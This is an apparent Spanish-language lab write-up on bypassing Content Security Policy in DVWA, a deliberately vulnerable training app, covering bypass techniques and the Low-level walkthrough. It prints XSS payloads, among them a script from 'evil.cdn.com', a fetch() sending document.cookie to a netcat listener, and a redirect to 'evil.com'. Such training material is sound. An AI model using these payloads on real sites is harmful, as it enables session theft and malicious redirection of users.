# 🛡️ CSP Bypass en DVWA

## ¿Qué es CSP?

**CSP (Content Security Policy)** es una cabecera de seguridad que los navegadores utilizan para limitar qué contenido se puede cargar o ejecutar en una página.

- Sirve como ***medida contra XSS*** y otras inyecciones de contenido.
- Ejemplo de cabecera CSP:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com
```

🔹 Eso significa que solo se pueden cargar scripts desde el mismo dominio (self) o desde **Google APIs**.

👉 En teoría, si hay CSP bien configurado, un XSS debería ser bloqueado.

## ¿Por qué estudiar CSP Bypass?

Porque en entornos modernos, aunque encuentres una inyección de JavaScript, muchas veces está protegido por CSP.

Un pentester debe:

- Revisar qué **directivas CSP** están configuradas.
- Detectar **lagunas o configuraciones débiles**.
- Intentar **saltarse esas restricciones** para ejecutar códido malicioso.

## Vulnerabilidad en DVWA: CSP Bypass

En DVWA, el reto es simular un entorno con CSP mal configurado y mostrar cómo un atacante puede **bypassear esas restricciones**.

### Objetivo del atacante:

- Conseguir ejecutar código JavaScript (como en XSS), a pesar de CSP.
- Robar cookies, redirigir usuarios o mostrar contenido falso.

## Técnicas de Bypass más comunes

En el laboratorio DVWA vamos a practicar estas ideas:

1. **Fuentes externas permitidas:** Si el CSP permite `script-src` desde ciertos dominios (ejemplo: Google, CDNJS...), el atacante puede cargar un script malicioso desde ahí:

```html
<script src="https://evil.cdn.com/malware.js"></script>
```

2. **Uso de inline event handlers:** Si CSP permite `unsafe-inline`, se puede usar:

```html
<img src=x onerror=alert('XSS CSP Bypass')>
```

3. **JSONP endpoints / callback abuse:** A veces un dominio permitido ofrece endpoints que devuelven código ejecutable (`?callback=alert(1)`).

4. **Trucos con `data:` o `blob:`: Algunos CSP mal configurados permiten ejecutar JavaScript desde URLs especiales:

```html
<script src="data:text/javascript,alert(1)"></script>
```

## Cómo explotar en DVWA

En Low / Medium / High vamos a encontrar diferencias:

- **Low:** CSP prácticamente inexistente → Podemos hacer un XSS directo.
- **Medium:** CSP mal configurado, permite ciertas fuentes externas → el objetivo es desubrirlas y usarlas.
- **High:** CSP más restrictivo, pero mal planteado → el bypass se hace con técnicas avanzadas (`data:`, `inline`, o abusando de algún dominio permitido).

## Qué aprenderemos

- Leer e interpretar cabeceras CSP.
- Reconocer errores comunes en la configuración.
- Aprovechar esos errores para ejecutar JavaScript malicioso.
- Documentar los vectores de ataque que funcionaron (y los que no).
- Aprender qué configuraciones evitarían los bypass en entornos reales.

## CSP BYPASS -- LOW

### 🔹 Paso 1: Ver el entorno

1. Iniciamos sesión en DVWA.
2. Ve a **CSP Bypass** en el menú lateral.
3. Asegúrate en DVWA Security que el nivel está en Low.

👉 En este nivel, no hay CSP real o es muy laxo, lo que significa que podemos hacer XSS sin limitaciones.

### 🔹 Paso 2: Prueba de XSS básica

En el campo de entrada escribimos un payload clásico como:

```html
<script>alert('XSS Low')</script>
```

✅ Si aparece la alerta → confirmas que el navegador no bloquea la ejecución de JavaScript.

### 🔹 Paso 3: Prueba con un payload más realista

A continuación, probaremos con payloads que simulen ataques reales:

**Ejemplo 1: Robar cookies**

```html
<script>fetch('http://127.0.0.1:4444/?cookie='+document.cookie)</script>)
```

👉 Esto intentaría enviar las cookies a tu servidor de pruebas en el puerto 4444 (puedes levantar un nc -lvnp 4444 en Kali para ver si llega la petición).

**Ejemplo 2: Redirección maliciosa**

```html
<script>window.location='http://evil.com'</script>
```

👉 Así rediriges a la víctima a un sitio bajo control del atacante.

